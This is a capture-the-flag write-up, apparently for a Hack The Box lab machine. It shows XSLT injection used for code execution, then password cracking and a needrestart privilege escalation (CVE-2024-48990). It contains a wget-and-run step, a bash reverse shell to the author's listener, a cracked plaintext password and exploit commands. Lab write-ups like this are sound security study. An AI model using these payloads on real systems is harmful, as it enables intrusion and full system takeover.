
The machine Conversor gives me an IP address and than says good luck bring me the user and system flags

**Recon**

First I start with the Recon phase, that meaning I can start with an nmap scan to uncover open ports
![[Pasted image 20251206092712.png]]
The scan shows 2 open ports:
- port 22 - for ssh
- port 80 - open for a web server having the domain `conversor.htb`(we also had to put the domain in `/etc/hosts`)

**Web Exploitation**

Next step in our journey is to inspect the webserver, so we are going to use the `burpsuite` tool to see the requests and responses while we wander through the files of the webserver

On the first interaction with the webserver we are met with a `login` form and also an option to register
![[Pasted image 20251206093100.png]]

Following the `Register` redirect I found a register form so I decide to create a test account to login and see what the webserver hides behind these forms
![[Pasted image 20251206093321.png]]

After login we are redirected to the main page which holds a converter of nmap scans
![[Pasted image 20251206093433.png]]
The user has to give to the web server an xml file containing the nmap scan along with an XSLT sheet to transform it into a more aesthetic format
- The site also gives us a template which is a simple format for an nmap scan

To test the site I downloaded the example `XSLT` file and also did an nmap scan of this IP address but this time I selected the output to be in an `XML` file with the command
`nmap -A -T4 10.10.11.92 -oX`
- After I uploaded the 2 files I got a link to my result
![[Pasted image 20251206094153.png]]

Now after I saw how this works my mind instantly went to the fact that this has to be 100% exploitable and I can introduce some malicious code in the `XSLT` file since that is the file that works with the processing par

 So after a quick search on google I found a website which tells me more about `XSLT Injection Attacks` and how these works https://blackhat.com/docs/us-15/materials/us-15-Arnaboldi-Abusing-XSLT-For-Practical-Attacks-wp.pdf
- The website teaches me that there are several `Server Side processors` for XSLT each corresponding to a certain group of programming languages:
	- `Libxslt` - python 2.7.10, php 5.5.20, perl 5.16, ruby 2.0.0p481
	- `Xalan` - Java, C++
	- `Saxon` - Java, JavaScript and `.NET`
Having this in mind now I have to find what processor it is and for that the pdf from the link comes in help and gives me 3 lines that must be included in the XSLT sheet to find system information
```XSLT
 Version: <xsl:value-of select="system-property('xsl:version')"/><br/>  
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br/>    Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/><br/> 
 Product Name: <xsl:value-of select="system-property('xsl:product-name')"/><br/>
 Product Version: <xsl:value-of select="system-property('xsl:product-version')"/><br/>
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')"/><br/>
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"/><br/>
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"/><br/> 
```
I introduce all this information in the XSLT sheet
![[Pasted image 20251206100400.png]]

Now its time to check by uploading a scan and the modified XSLT sheet
![[Pasted image 20251206100505.png]]
The script worked and it gave me valuable information:
- The version of the processor is `1.0`
- The processor is `libxslt` => it is run in python/php/ruby/perl

Seeing that the XSLT file is not sanitized I am thinking that maybe I can input raw code to see which one is successful depending on the language

Starting with Python:
- First I eliminated all the gibberish code from the XSLT sheet to make it easier for me and introduced a python command to get a reverse shell for me
- To really test if the connection is good I decided to do that by utilizing a python webserver to see if the target will connect to my web server to get a shell that I will put in a file
1. I created the file `shell.sh` which contains the script 
```shell
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
```
2. I created the `XSLT` sheet containing the the following python code inside the sheet
```python
import os
os.system("wget http://10.10.14.2:80/shell.sh; bash ./shell.sh")
```
![[Pasted image 20251206101933.png]]
3. I open a web server with `python3 -m http.server 80`
4. I open a `netcat` listener on another terminal with `nc -lvnp 4444`
5. Finally hope it's working because I am lazy and don't want to test for the other programming languages

What a surprise IT WORKED and it gave me a reverse shell as the `www-data`
![[Pasted image 20251206102750.png]]

**Privilege Escalation**

Having a shell as the `www-data` I decided to look around for potential leakage of important data through the server

Int the home folder of the user I found the `conversor.htb` directory which holds data about the application itself
![[Pasted image 20251206103237.png]]
Going further inside the `instance` directory I found a database named `users.db`
![[Pasted image 20251206103435.png]]
After this discovery I used `sqlite3 users.db` to gain access to that database and with a query I discovered some usernames and hashed passwords
![[Pasted image 20251206103555.png]]

Using `CrackStation` to help me crack these hashes I discovered that only one user could be important, that being the `fismathack` user
![[Pasted image 20251206103720.png]]

Now let's try to connect to the user account through ssh with the credentials:
- username: `fismathack`
- password: `Keepmesafeandwarm`
The connection went through and I gained access to the `fismathack` user account and also found the user flag in `user.txt`
![[Pasted image 20251206103915.png]]

# System Flag

In the process of gaining access to the `root` user I started by uncovering if and what the user can run with `sudo`
![[Pasted image 20251206104213.png]]
- The user can run alongside `sudo` the command `/usr/sbin/needrestart`
- Checking the version of the `needrestart` binary we discover it runs on version 3.7

Searching on Google about this version I stumble across the [CVE-2024-48990](https://nvd.nist.gov/vuln/detail/CVE-2024-48990) which leads to code execution as the `root` user

Also found a Git repo with Proof of Concept for this vulnerability https://github.com/makuga01/CVE-2024-48990-PoC

Working with this exploit will be a little bit tricky as I have to compile everything on my machine and then transfer it onto the target

So let's start:
- The PoC comes with 3 files:
	- `lib.c` - has to be compiled and contains the code to create the exploit itself in the `/tmp/poc` directory
	- `e.py` - a python script that will run continuously which will try to execute the content of the `/tmp/poc` folder to give the shell as the root user
	- `start.sh` - contains the assembling part where we compile and run the python script, but I will do it manually
1. First I will compile the `lib.c` so I can transfer it on the target
```shell
gcc -shared -fPIC -o ./__init__.so lib.c
```
2. Open a python web server on my machine and on the target create the directory `/tmp/exploit` where we going to run the exploit
- From now on we have to move very fast so the `e.py` can't be removed
3. Transfer the `__init__.so`  file on the target
4. Create a new directory called `importlib` move the `__init__.so`  file there
5. Transfer the `e.py` script and run it with the following command
```shell
PYTHONPATH="$PWD" python3 e.py
```
![[Pasted image 20251206111652.png]]
6. From another terminal run the `needrestart` script with `sudo` permissions
7. On the terminal where you ran `e.py` there should be a shell appearing 
8. If nothing appears check if the file `e.py` is still there and if not transfer it again on the target 

Finally we got the shell as the `root` user and now we can get the system flag
![[Pasted image 20251206111825.png]]